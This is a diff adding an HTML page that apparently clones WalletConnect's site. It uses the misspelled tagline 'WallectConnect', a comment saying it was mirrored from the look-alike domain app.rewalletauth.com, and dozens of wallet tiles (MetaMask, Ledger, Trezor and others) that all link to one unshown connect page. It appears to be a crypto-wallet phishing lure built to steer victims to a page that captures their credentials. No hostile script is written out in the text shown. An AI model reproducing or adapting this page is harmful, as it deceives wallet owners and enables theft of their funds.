@@ -1,0 +1,930 @@
+<html lang="eng">
+  <!-- <meta http-equiv="content-type" content="text/html;charset=UTF-8" /> -->
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" href="assets/main.css" type="text/css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Open protocol for connecting Wallets to Dapps"
+    />
+    <!-- MDB -->
+    <script
+      type="text/javascript"
+      src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.js"
+    ></script>
+    <meta property="og:image" content="images/logo.html" />
+    <link rel="icon" href="assets/logo.svg" />
+    <!-- Font Awesome -->
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+      rel="stylesheet"
+    />
+    <!-- MDB -->
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.4.2/mdb.min.css"
+      rel="stylesheet"
+    />
+
+    <!-- bootstrap CDN -->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
+      integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l"
+      crossorigin="anonymous"
+    />
+    <script>
+      function show() {
+        var x = document.getElementById("hidden");
+        if (x.style.display === "none") {
+          x.style.display = "block";
+        } else {
+          x.style.display = "none";
+        }
+
+        if (x.style.display === "block") {
+          document.getElementById("btn").innerHTML = "Show Less &uarr;";
+        } else {
+          document.getElementById("btun").innerHTML = "Show More &darr;";
+        }
+      }
+    </script>
+    <title>App.Wallet Authenticate</title>
+  </head>
+  <body>
+    <div class="top">
+      <a href="index9e36.html?v#footer?v" class="left">Github</a>
+
+      <a href="#?v" class="left">Docs</a>
+      <a href="index8ce4.html?k" class="main"
+        ><img alt="coin-iconics" src="assets/logo.svg" alt="logo"
+      /></a>
+      <a href="#wallets" class="left">Wallets</a>
+      <a href="#" class="left">Apps</a>
+    </div>
+    <br />
+    <div class="gFeYHJ"><h1>Wallet Authentication</h1></div>
+    <div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
+    <br />
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <img
+            alt="coin-iconics"
+            src="assets/banners.png"
+            alt="banners"
+            width="100%"
+          />
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <!-- first column -->
+        <div class="col-md-3"></div>
+        <div class="col-md-6 text-center">
+          <div class="bout text-center">
+            <h3 class="home">
+              <strong class="text-center">WALLET</strong>
+            </h3>
+            <p style="font-size: 25px" class="text-center">
+              Multiple iOS and Android wallets support the WallectConnect
+              protocol. Interaction between mobile apps and mobile browsers are
+              supported via mobile deep linking
+            </p>
+            <br />
+          </div>
+        </div>
+        <div class="col-md-3"></div>
+      </div>
+    </div>
+    <!-- all the coin on the application are all listed right under this container div -->
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="wallets" id="wallets">
+            <div class="row">
+              <div class="col-md-2"></div>
+              <div class="col-md-8">
+                <div>
+                  <i class="fa fa-search s-icon"></i
+                  ><input
+                    id="searchBox"
+                    type="search"
+                    placeholder="search platform"
+                  />
+                </div>
+              </div>
+              <div class="col-md-2"></div>
+            </div>
+
+            <div class="container mt-5">
+              <div class="row">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/metamask.png" alt="" />
+                      <br />
+                    </a>
+
+                    <div class="coin-name">Metamask</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/coinbase.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Coinbase</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/itoken.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Itoken</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/bitkeep.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Bitkeep</div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/safepal.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Safepal</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img
+                        width="50%"
+                        src="top-coins/terrastation.png"
+                        alt=""
+                      />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Terrastation</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/tronlink.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Tron link</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/swft.png" alt="" />
+                      <br />
+                    </a>
+                    <br /><small> CONNECT</small>
+                    <div class="coin-name">Swft</div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img
+                        width="50%"
+                        src="top-coins/walletconnect.svg"
+                        alt=""
+                      />
+                      <br />
+                      CONNECT
+                    </a>
+                    <div class="coin-name">Wallet connect</div>
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img
+                        width="50%"
+                        src="top-coins/ebac7b39-688c-41e3-7912-a4fefba74600.webp"
+                        alt=""
+                      />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/unnamed.png" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img
+                        width="50%"
+                        src="top-coins/spaces_-Mgv3_8586v0mVL4zZax_icon_WvDTo0Kodwa4awPEQrsO_flarelogo.webp"
+                        alt=""
+                      />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/c.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/a.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="images/tokenpocket.jpg" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/e.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/f.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/g.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/h.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/i.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/j.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/k.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/l.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/m.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/n.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/o.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/p.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/q.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/r.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/s.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/t.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/u.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/v.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/m.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/o.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/y.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+
+              <div class="row mt-5">
+                <div class="col-md-3 col-6 text-center center">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/z.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Wallet connect</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/zz.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Terrastation</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/t.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Tron link</div> -->
+                  </div>
+                </div>
+                <div class="col-md-3 col-6">
+                  <div class="tokens">
+                    <a href="connect/connect.html">
+                      <img width="50%" src="top-coins/h.webp" alt="" />
+                      <br />
+                      CONNECT
+                    </a>
+                    <!-- <div class="coin-name">Swft</div> -->
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <br />
+            <button
+              onclick="show()"
+              class="btn btn-info"
+              id="btn"
+              style="background-color: #416ad6"
+            >
+              Show More ↓
+            </button>
+            <br /><br />
+            <div class="hidden" id="hidden">
+              <div class="all">
+                <div class="apps">
+                  <a href="connect/connect.html" id="nano"
+                    ><img alt="coin-iconics" src="assets/nano.png" /></a
+                  ><br />
+                  Nano
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="tomo"
+                    ><img alt="coin-iconics" src="assets/tomo.png" /></a
+                  ><br />
+                  Tomo Chain
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="iotex"
+                    ><img alt="coin-iconics" src="assets/iotex.png" /></a
+                  ><br />
+                  IoTex
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="wanchain"
+                    ><img alt="coin-iconics" src="assets/wanchain.png" /></a
+                  ><br />
+                  Wanchain
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="kin"
+                    ><img alt="coin-iconics" src="assets/kin.png" /></a
+                  ><br />
+                  Kin
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="nimiq"
+                    ><img alt="coin-iconics" src="assets/nimiq.png" /></a
+                  ><br />
+                  Nimiq
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="aion"
+                    ><img alt="coin-iconics" src="assets/aion.png" /></a
+                  ><br />
+                  Aion
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="thundertoken"
+                    ><img alt="coin-iconics" src="assets/thundertoken.png" /></a
+                  ><br />
+                  Thunder Token
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="aeternity"
+                    ><img alt="coin-iconics" src="assets/aeternity.png" /></a
+                  ><br />
+                  Aeternity
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="nebulas"
+                    ><img alt="coin-iconics" src="assets/nebulas.png" /></a
+                  ><br />
+                  Nebulas
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="fio"
+                    ><img alt="coin-iconics" src="assets/fio.png" /></a
+                  ><br />
+                  FIO
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="gochain"
+                    ><img alt="coin-iconics" src="assets/gochain.png" /></a
+                  ><br />
+                  GoChain
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="poa"
+                    ><img alt="coin-iconics" src="assets/poa.png" /></a
+                  ><br />
+                  POA Network
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="callisto"
+                    ><img alt="coin-iconics" src="assets/callisto.png" /></a
+                  ><br />
+                  Callisto
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="bitpay"
+                    ><img alt="coin-iconics" src="assets/bitpay.jpg" /></a
+                  ><br />
+                  BitPay
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="aktionariat"
+                    ><img alt="coin-iconics" src="assets/aktionariat.png" /></a
+                  ><br />
+                  Aktionariat
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="atwallet"
+                    ><img alt="coin-iconics" src="assets/atwallet.png" /></a
+                  ><br />
+                  AtWallet
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="guard"
+                    ><img alt="coin-iconics" src="assets/guard.png" /></a
+                  ><br />
+                  Guard Wallet
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="aave"
+                    ><img alt="coin-iconics" src="assets/aave.jpg" /></a
+                  ><br />
+                  AAVE
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="exodus"
+                    ><img alt="coin-iconics" src="assets/exodus.jpg" /></a
+                  ><br />
+                  Exodus
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="enjin"
+                    ><img alt="coin-iconics" src="assets/enjin.jpg" /></a
+                  ><br />
+                  Enjin
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="skale"
+                    ><img alt="coin-iconics" src="assets/skale.png" /></a
+                  ><br />
+                  Skale
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="portis"
+                    ><img alt="coin-iconics" src="assets/portis.png" /></a
+                  ><br />
+                  Portis
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="trezor"
+                    ><img alt="coin-iconics" src="assets/trezor.png" /></a
+                  ><br />
+                  Trezor
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="squarelink"
+                    ><img alt="coin-iconics" src="assets/squarelink.png" /></a
+                  ><br />
+                  Squarelink
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="torus"
+                    ><img alt="coin-iconics" src="assets/torus.jpg" /></a
+                  ><br />
+                  Torus
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="vechain"
+                    ><img alt="coin-iconics" src="assets/vechain.jpg" /></a
+                  ><br />
+                  VeChain
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="scatter"
+                    ><img alt="coin-iconics" src="assets/scatter.jpg" /></a
+                  ><br />
+                  Scatter Wallet
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="math-wallet"
+                    ><img alt="coin-iconics" src="assets/math-wallet.png" /></a
+                  ><br />
+                  Math Wallet
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="fortmatic"
+                    ><img alt="coin-iconics" src="assets/fortmatic.png" /></a
+                  ><br />
+                  FortMatic
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="digitex"
+                    ><img alt="coin-iconics" src="assets/digitex.png" /></a
+                  ><br />
+                  Digitex
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="ledger"
+                    ><img alt="coin-iconics" src="assets/ledger.png" /></a
+                  ><br />
+                  Ledger
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="defiat"
+                    ><img alt="coin-iconics" src="assets/defiat.jpg" /></a
+                  ><br />
+                  Defiat
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="authereum"
+                    ><img alt="coin-iconics" src="assets/authereum.png" /></a
+                  ><br />
+                  Authereum
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="flare"
+                    ><img alt="coin-iconics" src="assets/flare.jpg" /></a
+                  ><br />
+                  Flare Wallet
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="zelcore"
+                    ><img alt="coin-iconics" src="assets/zelcore.png" /></a
+                  ><br />
+                  Zelcore
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="bitkeep"
+                    ><img alt="coin-iconics" src="assets/bitkeep.png" /></a
+                  ><br />
+                  BitKeep
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="coin98"
+                    ><img alt="coin-iconics" src="assets/coin98.png" /></a
+                  ><br />
+                  Coin98
+                </div>
+
+                <div class="apps">
+                  <a href="connect/connect.html" id="trustvault"
+                    ><img alt="coin-iconics" src="assets/trustvault.png" /></a
+                  ><br />
+                  Trust Vault
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="terra"
+                    ><img alt="coin-iconics" src="assets/terra.png" /></a
+                  ><br />
+                  Terra Station
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="polka"
+                    ><img alt="coin-iconics" src="assets/polka.jpg" /></a
+                  ><br />
+                  Polka Wallet
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="safepal"
+                    ><img alt="coin-iconics" src="assets/safepal.png" /></a
+                  ><br />
+                  Safepal
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="ronin"
+                    ><img alt="coin-iconics" src="assets/ronin.jpg" /></a
+                  ><br />
+                  Ronin
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="fantom"
+                    ><img alt="coin-iconics" src="assets/fantom.png" /></a
+                  ><br />
+                  Fantom
+                </div>
+                <div class="apps">
+                  <a href="connect/connect.html" id="cosmostation"
+                    ><img alt="coin-iconics" src="assets/cosmostation.png" /></a
+                  ><br />
+                  Cosmostation
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div id="footer">
+        <p>
+          <img alt="coin-iconics" src="assets/discord.svg" class="footimg" />
+          <a href="https://discord.gg/jhxMvxP">Discord</a>
+        </p>
+        <br />
+        <p>
+          <img alt="coin-iconics" src="assets/telegram.svg" class="footimg" />
+          <a href="https://t.me/walletconnect_announcements">Telegram</a>
+        </p>
+        <br />
+        <p>
+          <img alt="coin-iconics" src="assets/twitter.svg" class="footimg" />
+          <a href="https://twitter.walletconnect.org/">Twitter</a>
+        </p>
+        <br />
+        <p>
+          <img alt="coin-iconics" src="assets/github.svg" class="footimg" />
+          <a href="https://github.com/walletconnect">Github</a>
+        </p>
+        <br />
+      </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+  </body>
+  <!-- Mirrored from app.rewalletauth.com/?k by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Dec 2021 13:59:19 GMT -->
+</html>
